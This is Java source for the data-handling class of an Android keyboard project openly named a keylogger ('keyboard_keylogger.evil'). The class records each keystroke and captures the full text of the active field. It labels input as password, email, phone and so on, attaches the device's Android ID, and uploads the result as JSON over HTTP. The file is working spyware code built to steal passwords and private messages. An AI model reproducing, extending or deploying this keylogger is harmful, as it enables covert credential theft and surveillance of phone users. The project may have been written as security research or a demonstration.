package com.example.keyboard_keylogger.evil;

import android.inputmethodservice.InputMethodService;
import android.provider.Settings;
import android.text.InputType;
import android.view.inputmethod.InputConnection;

import androidx.annotation.NonNull;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;

public class InformationManager {
    private String allText;
    private final ArrayList<Character> text;
    private final String androidId;
    private String inputType;
    private static InformationManager instance =null;

    private InformationManager(@NonNull InputMethodService ime){
        this.text = new ArrayList<>();
        this.androidId = Settings.Secure.getString(ime.getContentResolver(), Settings.Secure.ANDROID_ID);
    }

    public static InformationManager getInstance(InputMethodService ime){
        if (instance==null)
        instance = new InformationManager(ime);
        return instance;
    }
    public static InformationManager getInstance(){
        return instance;
    }
    /**
     * Gets information about IME service passed as an argument
     * @param text ArrayList<Character> of text
     * @param androidId Unique ID for the user
     * @param inputType Input Type like password, text, email, number...
     * @return JSONObject
     */
    @NonNull
    private JSONObject createJSONObject(ArrayList<Character> text, String inputType, String androidId) {
        String inputText = getStringRepresentation(text);

        JSONObject infoObject= new JSONObject();
        try {
            infoObject.put("text",inputText);
            infoObject.put("inputType",inputType);
            infoObject.put("id",androidId);
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return infoObject;

    }

    public void addInputTypeFromIME(@NonNull InputMethodService ime){
        this.inputType = determineInputType(ime.getCurrentInputEditorInfo().inputType);
    }
    public void addChar(char c){
        text.add(c);
        allText += c;
    }
    public void sendInfo(){
        System.out.println("All text: "+allText);
        JSONObject infoObject = createJSONObject(text,inputType,androidId);
        new HTTPReqTask().setBody(infoObject.toString()).execute();
        text.clear();
    }

    @NonNull
    private String getStringRepresentation(@NonNull ArrayList<Character> list) {
        StringBuilder builder = new StringBuilder(list.size());
        for(Character ch: list)
        {
            builder.append(ch);
        }
        return builder.toString();
    }
    @NonNull
    private String determineInputType(int inputType){
        int variation = inputType & InputType.TYPE_MASK_VARIATION;
        int inputClass = inputType & InputType.TYPE_MASK_CLASS;

        switch (inputClass){
            case InputType.TYPE_CLASS_NUMBER: return "Number";
            case InputType.TYPE_CLASS_DATETIME: return "Date";
            case InputType.TYPE_CLASS_PHONE: return "Phone";
            case InputType.TYPE_CLASS_TEXT:
                if(InputTypeUtils.isEmailVariation(variation)){
                    return "Email";
                }
                else if (InputTypeUtils.isPasswordInputType(inputType) || InputTypeUtils.isVisiblePasswordInputType(inputType)) return "Password";
                else if(variation==InputType.TYPE_TEXT_VARIATION_URI) return "URL";
                else if(variation==InputType.TYPE_TEXT_VARIATION_SHORT_MESSAGE) return "SM";
                else if(variation==InputType.TYPE_TEXT_VARIATION_FILTER) return "Text";
                else return "Text";
        }


        return "Text";
    }
    public void extractAllTextFromInputField(InputConnection ic){
        String temp;
        temp = ic.getTextBeforeCursor(9999, 0).toString() + ic.getTextAfterCursor(9999, 0).toString();
        this.allText = temp;
    }

}
